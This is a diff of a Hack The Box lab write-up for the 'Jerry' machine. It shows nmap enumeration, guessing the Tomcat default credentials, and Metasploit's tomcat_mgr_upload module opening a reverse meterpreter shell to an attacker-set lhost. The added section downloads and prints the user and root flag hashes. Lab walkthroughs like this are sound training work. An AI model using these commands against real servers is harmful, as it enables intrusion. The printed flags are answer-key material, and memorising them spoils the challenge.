@@ -1,17 +1,13 @@
 ![jerry](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Jerry/jerry.png)
-\
 
 ## Enumeration
 
-\
 Start with an nmap scan:
 
-\
 ```
 nmap -A 10.10.10.95
 ```
 
-\
 ```
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2018-07-26 15:18 EDT
 Nmap scan report for 10.10.10.95
@@ -39,10 +35,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 28.45 seconds
 ```
 
-\
 Looks like the only port open is 8080, which is running Apache Tomcat 1.1.  Some research pointed me to a [metasploit module](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login) for logging into Apache Tomcat using default credentials.  Using this I got the credentials tomcat:s3cret.  Now we can use the [tomcat manager authenticated upload module](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/). This module can be used to execute a payload on Apache Tomcat servers that have an exposed “manager” application. The payload is uploaded as a WAR archive containing a JSP application using a POST request against the /manager/html/upload component:
 
-\
 ```
 msf > use exploit/multi/http/tomcat_mgr_upload
 msf exploit(tomcat_mgr_upload) > set HttpUsername tomcat
@@ -61,6 +55,26 @@ msf exploit(tomcat_mgr_upload) > set lhost 10.10.14.232
 lhost => 10.10.14.232
 ```
 
-\
+We got a meterpreter shell on the machine, and from there I was able to navigate to the file containing both the user and root hashes:
+
+```
+meterpreter > dir
+meterpreter > cd c:\
+meterpreter > cd \Users
+meterpreter > cd \Administrator
+meterpreter > cd \Desktop
+meterpreter > cd \flags
+meterpreter > download 2 for the price of 1.txt
+```
+
+I then pulled it back to my local machine to view both flags:
+```
+root@kali:~# cat 2\ for\ the\ price\ of\ 1.txt 
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
+```
 
 
